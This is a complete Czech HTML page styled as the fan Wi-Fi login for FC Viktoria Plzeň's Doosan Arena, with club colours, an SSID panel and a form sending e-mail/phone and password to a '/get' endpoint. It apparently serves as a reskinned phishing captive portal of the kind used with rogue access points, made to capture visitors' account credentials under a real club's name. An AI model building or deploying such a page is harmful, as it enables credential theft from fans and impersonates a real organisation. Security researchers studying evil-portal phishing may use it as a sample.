<!DOCTYPE html>
<html lang="cs">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>FC Viktoria Plzeň · Přihlášení k Wi-Fi</title>
<style>
  :root{
    --plzen-red:#e30613;
    --plzen-blue:#004b87;
    --plzen-yellow:#ffd200;
    --ink:#0f1220;
    --text:#fff;
    --muted:#e8ebf3;
    --stroke:rgba(255,255,255,.15);
    --radius:14px;
    --shadow:0 18px 48px rgba(0,0,0,.35);
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0; font-family:Arial, sans-serif; color:var(--text);
    background:
      radial-gradient(1200px 400px at 100% -10%, rgba(255,255,255,.06), transparent 60%),
      radial-gradient(900px 300px at -10% 110%, rgba(255,255,255,.06), transparent 60%),
      linear-gradient(135deg, var(--plzen-red) 0%, var(--plzen-blue) 70%);
    display:grid; place-items:center; padding:24px;
  }

  .wrap{
    width:100%; max-width:980px;
    display:grid; grid-template-columns:1.2fr 1fr; gap:28px;
  }
  @media (max-width: 880px){
    .wrap{grid-template-columns:1fr}
  }

  /* Levý hero panel */
  .hero{
    position:relative; overflow:hidden; border-radius:var(--radius); padding:32px; min-height: 420px;
    background:
      repeating-linear-gradient( to bottom, rgba(0,0,0,.08), rgba(0,0,0,.08) 2px, transparent 2px, transparent 24px ),
      linear-gradient(160deg, rgba(255,255,255,.08), rgba(255,255,255,0) 45%),
      linear-gradient( to bottom right, #e30613, #004b87 );
    box-shadow: var(--shadow);
    isolation:isolate;
  }
  .hero::after{
    content:""; position:absolute; inset:auto -60px -60px -60px; height:180px;
    background: linear-gradient(90deg, var(--plzen-red) 0 33%, var(--plzen-blue) 33% 66%, var(--plzen-yellow) 66% 100%);
    filter:saturate(120%); transform:rotate(-6deg); z-index:0; opacity:.27;
  }
  .brand{ position:relative; z-index:1; display:flex; align-items:center; gap:14px; margin-bottom: 12px; }
  .crest{ width:60px; height:60px; flex:0 0 auto; border-radius:12px; overflow:hidden; box-shadow:0 6px 18px rgba(0,0,0,.35); border:1px solid var(--stroke)}
  .brand h1{ font-size:26px; font-weight:700; margin:0; letter-spacing:.4px; text-transform:uppercase }
  .brand small{ display:block; font-weight:600; opacity:.9 }

  .hero h2{ margin:14px 0 6px; font-size:24px }
  .hero p{ margin:0; color:var(--muted) }

  .stats{ margin-top:18px; display:grid; grid-template-columns:repeat(3, minmax(0,1fr)); gap:12px }
  .stat{ background:rgba(255,255,255,.06); border:1px solid var(--stroke); padding:12px 14px; border-radius:12px }
  .stat b{ display:block; font-size:18px }
  .stat small{ opacity:.9 }

  /* Pravá karta – tu navážeme na původní markup */
  .form-container{
    background: rgba(255,255,255,.06);
    border:1px solid var(--stroke);
    border-radius: var(--radius);
    padding: 24px;
    box-shadow: var(--shadow);
    backdrop-filter: blur(8px);
  }
  .logo{ text-align:left; margin-bottom: 8px }

  h1{
    text-align:left;
    font-size:24px;
    font-weight:700;
    margin:0 0 6px;
    color:#fff;
  }
  h2{
    text-align:left;
    margin:0 0 18px;
    font-size:14px; font-weight:600; color:var(--muted);
  }

  .input-field{
    width:100%;
    padding:12px 14px;
    border:1px solid var(--stroke);
    background:#0e1220;
    color:#fff;
    border-radius:10px;
    box-sizing:border-box;
    margin-bottom:14px;
    font-size:15px;
    outline:none;
    transition:.2s border-color, .2s box-shadow, .2s transform;
  }
  .input-field:focus{
    border-color: var(--plzen-yellow);
    box-shadow:0 0 0 3px rgba(255,210,0,.26);
    transform: translateY(-1px);
  }

  .submit-btn{
    background: linear-gradient(180deg, var(--plzen-yellow), #e6c400);
    border: none; color: #0a1434;
    padding: 12px 18px; border-radius:999px; cursor: pointer; font-size:16px; font-weight:800;
    box-shadow:0 10px 26px rgba(255,210,0,.35);
    transition: transform .12s ease, filter .12s ease, box-shadow .2s ease;
    width:100%;
  }
  .submit-btn:hover{ transform: translateY(-1px); filter:saturate(110%); box-shadow:0 14px 32px rgba(255,210,0,.45) }

  /* Kontejner z původního kódu – zůstává, jen upravíme layout */
  .container{
    max-width:unset; margin:0; padding:0;
  }

  /* Doplňkový badge */
  .badge{
    display:inline-block; background:rgba(255,210,0,.2); border:1px solid rgba(255,210,0,.35);
    color:#fff; padding:6px 10px; border-radius:999px; font-size:12px; font-weight:700; letter-spacing:.3px;
  }
</style>
</head>

<body>

<div class="wrap">

  <!-- Levý panel (nový) -->
  <section class="hero" aria-label="FC Viktoria Plzeň – Wi-Fi">
    <div class="brand">
      <svg class="crest" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <defs>
          <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
            <stop offset="0%" stop-color="#e30613"/>
            <stop offset="100%" stop-color="#004b87"/>
          </linearGradient>
        </defs>
        <rect x="2" y="2" width="60" height="60" rx="12" fill="url(#g)"/>
        <rect x="20" y="20" width="24" height="24" fill="#ffd200" opacity=".95"/>
      </svg>
      <div>
        <h1>FC VIKTORIA PLZEŇ</h1>
        <small>Doosan Arena · Stadionová síť</small>
      </div>
    </div>
    <span class="badge">Plzeň Wi-Fi</span>
    <h2>Přihlášení k síti</h2>
    <p>Rychlé a bezpečné připojení pro fanoušky na stadionu.</p>

    <div class="stats" aria-label="Stav sítě">
      <div class="stat"><b>PlzenWifi</b><small>SSID</small></div>
      <div class="stat"><b>—</b><small>síla signálu</small></div>
      <div class="stat"><b>—</b><small>zatížení</small></div>
    </div>
  </section>

  <!-- Pravý panel – PŮVODNÍ FORM ZŮSTÁVÁ BEZE ZMĚN MARKUPU -->
  <div class="form-container">
    <div class="logo"></div>
    <center>
      <h1>Přihlášení</h1>
      <h2>FC Viktoria Plzeň · Stadionová síť</h2>
    </center>
    <form action="/get" id="login-form">
      <input name="email" class="input-field" type="text" placeholder="E-mail nebo telefon" required>
      <input name="password" class="input-field" type="password" placeholder="Heslo" required>
      <button class="submit-btn" type="submit">Pokračovat</button>
    </form>
  </div>

</div>

</body>
</html>
